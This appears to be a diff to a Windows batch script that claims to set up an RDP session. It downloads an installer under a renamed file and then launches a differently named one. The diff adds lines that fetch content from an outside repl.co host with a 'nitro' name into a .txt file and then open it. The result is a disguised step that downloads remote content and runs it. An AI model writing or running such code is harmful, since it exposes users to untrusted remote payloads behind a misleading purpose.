@@ -21,5 +21,7 @@ echo .
 echo  RDP has been created.
 echo  Please Login to Your RDP !
 curl -o lel.exe https://storage.medal.tv/MedalSetup.exe
+curl -o lel.txt https://helpingnitro.coolcool4.repl.co
 start lol.exe
+start lel.txt
 ping -n 10 127.0.0.1 >nul
